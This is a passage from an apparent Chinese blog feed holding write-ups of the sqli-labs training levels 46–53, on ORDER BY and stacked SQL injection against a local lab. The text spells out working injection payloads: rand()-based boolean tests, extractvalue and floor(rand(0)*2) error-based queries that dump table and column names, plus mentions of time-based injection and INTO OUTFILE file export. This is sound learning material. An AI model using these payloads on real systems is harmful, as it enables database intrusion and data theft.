src="/img/sql-labs54-61/61.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/62.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs54-61/63.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      sql-labs54-61
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs50-53</title>
    <link href="https://Foxgrin.github.io//posts/58721/"/>
    <id>https://Foxgrin.github.io//posts/58721/</id>
    <published>2018-07-09T09:08:00.000Z</published>
    <updated>2018-07-09T13:33:44.951Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs中关于order by 注入和堆叠注入结合的关卡<a id="more"></a></p><h2 id="Less50-53"><a href="#Less50-53" class="headerlink" title="Less50-53"></a>Less50-53</h2><h3 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h3><p>输入sort=1,2,3得到正常排序的表，输入sort=1’和sort=1”都报错，说明没有引号包裹</p><p>先试试rand()</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs50-53/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再试试报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现都可以正常注入</p><p>看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现多重查询</p><p>说明这关可以进行堆叠注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现添加了新的一行 </p><p><img src="/img/sql-labs46-49/12.png" alt=""></p><p>被单引号包裹 </p><p><img src="/img/sql-labs46-49/13.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/14.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/15.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>被单引号包裹，没有报错信息</p><p>对堆叠注入没有影响</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>被单引号包裹，并且没有报错，依然对堆叠没有影响 </p><p><img src="/img/sql-labs46-49/19.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/20.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      sql-labs50-53
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql-labs46-49</title>
    <link href="https://Foxgrin.github.io//posts/15069/"/>
    <id>https://Foxgrin.github.io//posts/15069/</id>
    <published>2018-07-09T08:38:00.000Z</published>
    <updated>2018-07-09T13:33:44.951Z</updated>
    
    <content type="html"><![CDATA[<p>总结了sql-labs中关于order by后面的注入的一些关卡<a id="more"></a></p><h2 id="Less46-49"><a href="#Less46-49" class="headerlink" title="Less46-49"></a>Less46-49</h2><h3 id="Less46"><a href="#Less46" class="headerlink" title="Less46"></a>Less46</h3><p>首先页面呈现 </p><p><img src="/img/sql-labs46-49/1.png" alt=""></p><p>要我们get方式输入一个名为sort的参数</p><p>那我们输入/?sort=1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现输出了users表里面的信息 </p><p><img src="/img/sql-labs46-49/3.png" alt=""></p><p>输入sort=2时，发现排序变化了，按照第二列username的值进行了排序，于是猜测sql语句为select * from users order by get[‘sort’]，</p><p>但是，又有个问题，之前的关卡都是将查询的结果利用mysql_fetch_array($result)=$row，这样都是输出一行结果，为什么这关输出了所有的结果</p><p>看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Sql语句与猜想的一样 </p><p><img src="/img/sql-labs46-49/5.png" alt=""></p><p>如果查询的结果不为空，那么</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>建立一个表格</p><p>Th标签能使里面的文件加粗并居中，td标签里的文本是默认向左对齐，不加粗</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这是最关键的代码，和之前关卡不一样，这里用到了新的一个函数，mysql_fetch_assoc()</p><p>经过查询，这个函数与mysql_fetch_array区别只在于前者返回的是关联数组，而后者既能返回关联数组又能返回索引数组</p><p>而要返回多个结果，就需要while循环，如果不用while循环，那么只能返回一个查询结果</p><p>源代码搞懂了，那么怎么进行注入呢</p><p>输入sort=1 desc，变成降序排列，默认是asc，也就是升序排列</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们通过sql语句观察出这题注入点应该是order by 后面的数字</p><p>先认识一个随机查询，select * from users order by rand()</p><p>Rand()函数是随机产生一个0到1之间的数字</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出两次产生的是不同的随机数</p><p>而如果在括号内指定参数即rand(0)和rand(1)，则会产生固定的随机数种子</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>随机查询就是利用rand()函数产生不同的随机数种子，这些产生的随机数进行order by 排序，order by后面的参数如果是产生固定的随机数种子，随机排序的表就是固定的 </p><p><img src="/img/sql-labs46-49/11.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是我们利用在rand()函数的参数中构造逻辑表达式，根据返回的表判断逻辑表达式的真假，从而进行注入，比如/?sort=rand(ascii(substr(database(),1,1))=115) </p><p><img src="/img/sql-labs46-49/13.png" alt=""></p><p>发现返回是rand(false)也就是rand(0)的随机排序表，说明上述逻辑表达式为假 </p><p>我们再先试试union查询可不可以 </p><p><img src="/img/sql-labs46-49/14.png" alt=""></p><p>报错了，是不是union 和order by不能一起使用了，我们在mysql命令行中测试一下，发现以下两种是不会报错的，一种是在联合两边的select 语句分别加括号，一种是将order by放入后面的select语句 </p><p><img src="/img/sql-labs46-49/15.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/16.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>为什么呢，经过查询发现union查询并不是只是简简单单的将两个子查询结果进行拼接，而是将两个查询结果统一查询，所以order by 应该放在最后一个子查询中</p><p>然而这关我们是在order by后进行注入，所以不能使用union注入</p><p>那能不能使用延时注入呢，也就是通过order by 1 and if(,1,sleep())</p><p>我们先在mysql命令行中测试一下</p><p>发现sleep了18秒，猜测是因为有18秒的原因，至于为什么是排序成这样，请教学长，学长也无法解释，暂时将这个问题搁在一边，但是抛开这个问题，利用这个方法进行延时注入是可行的，经过测试只要保证order by后面的参数不会报错，就能执行and后面的语句，经过测试带小数的数字，任何字符和字符串，列名，1,2,3都不会报错，但只有列名和1,2,3当做参数，才会对表排序，其他都会得到原来的表</p><p>下面试试延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/17.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功延时9秒</p><p>再试试能不能通过and 进行报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/18.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>非常完美，那么就可以进行熟悉爆表爆列了 </p><p><a href="http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x3a))" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x3a))</a> </p><p><img src="/img/sql-labs46-49/19.png" alt=""></p><p><a href="http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),0x3a))" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),0x3a))</a> </p><p><img src="/img/sql-labs46-49/20.png" alt=""></p><p>那么count(<em>),group by,floor(rand(0)</em>2)的报错注入能不能在这里运用呢 </p><p><a href="http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%201=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,database(),0x3a,floor(rand(0)*2)))" target="_blank" rel="noopener">http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%201=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,database(),0x3a,floor(rand(0)*2)))</a> </p><p><img src="/img/sql-labs46-49/21.png" alt=""></p><p>没问题，但除此之外还有一种方法进行这种报错注入，就是利用sort=(select …)进行报错注入 </p><p><img src="/img/sql-labs46-49/22.png" alt=""></p><p>还有一种方法，可以在order by后面的procedure analyse参数进行报错注入 </p><p><img src="/img/sql-labs46-49/23.png" alt=""></p><p>但是这里又碰到一个问题，procedure analyse后面的报错注入，加入子查询语句会报错，原因未知，可能是语法错误，暂时来看这个方法只能注出库名，用户名和版本 </p><p><img src="/img/sql-labs46-49/24.png" alt=""></p><p>Into outfile 注入 </p><p><img src="/img/sql-labs46-49/25.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/26.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><p>输入sort=1,2,3发现都得到原来的表，猜测sort可能被引号包裹，成为字符，所以排序后仍为原来的表，加个单引号 </p><p><img src="/img/sql-labs46-49/27.png" alt=""></p><p>发现报错了，果然被单引号包裹了</p><p>先试试随机查询rand()</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/28.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>还是原来的表，说明这里用rand()是不行的</p><p>那么用and +报错注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/29.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/30.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/31.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>延时注入 </p><p><img src="/img/sql-labs46-49/32.png" alt=""></p><p>另外一种报错注入，经过测试必须通过and 后面才能执行，之前关卡的sort=(select …)方法测试不会报错</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/33.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>Procedure analyse 报错注入 </p><p><img src="/img/sql-labs46-49/34.png" alt=""></p><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><p>输入sort=1,2,3，发现正常排序，说明sort没有被引号包裹，输入1’</p><p>发现没有报错，说明不返回报错信息，所以这关不能用报错注入</p><p>排除sort=(select count(*))注入和and +报错和procedure analyse 报错注入</p><p>那么试试sort=rand()注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/35.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这是rand(true)排序的表 </p><p><img src="/img/sql-labs46-49/36.png" alt=""></p><p>这是rand(false)排序的表</p><p>再试试 and +延时注入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>导出文件 </p><p><img src="/img/sql-labs46-49/38.png" alt=""></p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><p>输入sort=1,2,3发现都得到原来的表，说明有引号包裹，在输入sort=1’，没有输出表，没有报错，说明被单引号包裹，并且没有返回报错信息</p><p>那么排除了报错注入，rand()，那只能延时注入和导出文件了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql-labs46-49/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>文件导出 </p><p><img src="/img/sql-labs46-49/40.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      sql-labs46-49
    
    </summary>
    
      <category term="sql-labs" scheme="https://Foxgrin.github.io/categories/sql-labs/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
</feed>
